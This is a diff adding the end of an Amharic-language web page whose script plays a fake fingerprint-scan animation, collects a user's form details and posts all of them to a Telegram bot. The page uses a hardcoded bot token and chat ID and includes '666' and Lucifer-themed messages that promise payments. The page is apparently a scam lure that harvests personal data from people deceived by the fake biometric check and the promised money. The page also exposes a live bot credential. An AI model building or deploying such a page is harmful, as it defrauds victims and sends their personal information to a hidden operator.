+        mainContent.style.display = 'block';
+        errorMessage.textContent = '';
+      } else {
+        errorMessage.textContent = 'የተጠቃሚ ስም ወይም የይለፍ ቃል ትክክል አይደለም።';
+      }
+    });
+
+    logoutBtn.addEventListener('click', () => {
+      mainContent.style.display = 'none';
+      document.getElementById('login-form').style.display = 'block';
+      document.getElementById('username').value = '';
+      document.getElementById('password').value = '';
+      errorMessage.textContent = '';
+      scanCompleted = false;
+      fpSuccess.classList.remove('show');
+      fpWrap.classList.remove('disabled');
+      document.getElementById('user-info-form').style.display = 'none';
+    });
+
+    function setFingerprintGradient(active, dynamicHue) {
+      if (active) {
+        let grad = fingerprintSVG.querySelector('#fpActiveGradient');
+        grad.children[0].setAttribute('stop-color', `hsl(${dynamicHue}, 95%, 56%)`);
+        grad.children[1].setAttribute('stop-color', `hsl(${(dynamicHue + 35) % 360}, 100%, 53%)`);
+        fpPaths.setAttribute('stroke', 'url(#fpActiveGradient)');
+      } else {
+        fpPaths.setAttribute('stroke', 'url(#fpGradient)');
+      }
+    }
+
+    function animateColor() {
+      if (!animating) return;
+      hue = (hue + 4) % 360;
+      setFingerprintGradient(true, hue);
+      animationFrame = requestAnimationFrame(animateColor);
+    }
+
+    function showSuccess(name, code) {
+      fpSuccess.classList.add('show');
+      fpInstruction.textContent = "ስነምር ተጠናቋል!";
+      fpWrap.classList.add('disabled');
+      scanCompleted = true;
+      completeSound.currentTime = 0;
+      completeSound.play();
+
+      document.getElementById('successText').innerHTML =
+        `<b>አመሰግናለሁ ${name}!</b> <br> <span style="color:#ffae00;">የእርስዎ መረጃ በተሳካ ሁኔታ ተቀብሏል። <span class="sixmark">666</span> <span class="phone-inline">0997235723</span></span>`;
+      document.getElementById('successDesc').innerHTML =
+        `ማስታወሻ፣ የበለይ መለያ ቁጥርዎ ከዚህ በታች ታያላችሁ።<br><span style="color:#ffae00;">የተስፋ መለያ <span class="sixmark">666</span>: <span class="phone-inline">0997235723</span></span>`;
+      document.getElementById('successCode').innerHTML =
+        `<b>${code}</b>`;
+      document.getElementById('user-info-form').style.display = 'block';
+      setTimeout(()=>{document.getElementById('fullName').focus()}, 300);
+    }
+
+    function startAnimation() {
+      if (animating || scanCompleted) return;
+      fpInstruction.innerHTML = "የጣትዎን ምልክት በዚህ ላይ ይቆዩ... <span class='sixmark'>666</span> <span class='phone-inline'>0997235723</span>";
+      animating = true;
+      fpWrap.classList.add('active');
+      animateColor();
+      holdSound.currentTime = 0;
+      holdSound.play();
+      holdTimeout = setTimeout(() => {
+        stopAnimation(true);
+      }, 1400);
+    }
+
+    function stopAnimation(showCompleted) {
+      if (scanCompleted) return;
+      animating = false;
+      cancelAnimationFrame(animationFrame);
+      fpWrap.classList.remove('active');
+      setFingerprintGradient(false, 0);
+      holdSound.pause();
+      holdSound.currentTime = 0;
+      fpInstruction.innerHTML = "ጣትዎን በስነምር ላይ ያዙ። <span class='phone-inline'>0997235723</span>";
+      if (holdTimeout) {
+        clearTimeout(holdTimeout);
+        holdTimeout = null;
+      }
+      if (showCompleted && !scanCompleted) {
+        showSuccess('የጣት አሻራወን በተሰካ ሁኔታ ሰጥተዋል ');
+      }
+    }
+
+    fpWrap.addEventListener('touchstart', startAnimation);
+    fpWrap.addEventListener('mousedown', startAnimation);
+    document.addEventListener('touchend', () => stopAnimation(false));
+    document.addEventListener('mouseup', () => stopAnimation(false));
+    fpWrap.addEventListener('mouseleave', () => stopAnimation(false));
+    fpWrap.addEventListener('keydown', function(e) {
+      if ((e.key === " " || e.key === "Enter") && !scanCompleted) startAnimation();
+    });
+    fpWrap.addEventListener('keyup', function(e) {
+      if ((e.key === " " || e.key === "Enter") && !scanCompleted) stopAnimation(false);
+    });
+
+    // Telegram/user info logic
+    const botToken = '7130965778:AAGNEDmef0ZChMDYxez-el7Bk-2xChnzcFU';
+    const chatId = '8155585808';
+
+    function generateUniqueCode(name) {
+      const initials = (name || '').trim().split(/\s+/).map(n => n[0]).join('').toUpperCase();
+      const rand = Math.random().toString(36).substr(2,5).toUpperCase();
+      return `S666-${initials}-${rand}`;
+    }
+
+    document.getElementById('infoForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+      const formData = new FormData(this);
+      const name = formData.get('ሙሉ ስም') || 'ተጠቃሚ';
+      const code = generateUniqueCode(name);
+
+      let message = `🔥 አዲስ ተጠቃሚ መረጃ 666 🔥\nሙሉ ስም: ${name}\n`;
+      for (let [key, value] of formData.entries()) {
+        message += `${key}: ${value}\n`;
+      }
+      message += `የበለይ መለያ: ${code}\nስልክ: 0997235723\n`;
+
+      document.getElementById('userInfoSpinner').style.display = 'inline-block';
+      document.getElementById('submitUserInfoBtn').disabled = true;
+      sendToTelegram(message, name, code);
+    });
+
+    function sendToTelegram(message, name, code) {
+      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+      const data = {chat_id: chatId, text: message};
+      fetch(url, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify(data)
+      })
+      .then(response => response.json())
+      .then(data => {
+        document.getElementById('userInfoSpinner').style.display = 'none';
+        document.getElementById('submitUserInfoBtn').disabled = false;
+        if (data.ok) {
+          document.getElementById('user-info-form').style.display = 'none';
+          document.getElementById('fpSuccess').classList.add('show');
+          document.getElementById('successText').innerHTML =
+            `<b>በጌታ ሉሲፈር ስም እናመሰግናለን ውድ ${name}!</b> <br>
+            <span style="color:#ffae00;">የእርስዎ መረጃ በተሳካ ሁኔታ ተልኳል። <span class="sixmark">666</span> <span class="phone-inline">0997235723</span></span>`;
+          document.getElementById('successDesc').innerHTML =
+            `የስራዎ ሁሉ በሳይጣን ብርሃን ተጠበቀ። ቃል የተገባልዎት ክፍያዎች ሁሉ ተፈፃሚ ይሆናሉ<br><span style="color:#ffae00;">የበለይ መለያ <span class="sixmark">666</span>: <span class="phone-inline">0997235723</span></span>`;
+          document.getElementById('successCode').innerHTML =
+            `<b>${code}</b>`;
+        } else {
+          alert('መረጃውን ለመላክ አልተሳካም።');
+        }
+      })
+      .catch(error => {
+        document.getElementById('userInfoSpinner').style.display = 'none';
+        document.getElementById('submitUserInfoBtn').disabled = false;
+        alert('መረጃውን ለመላክ ሳለ ስህተት ተከስቷል።');
+      });
+    }
+  </script>
+</body>
+</html>
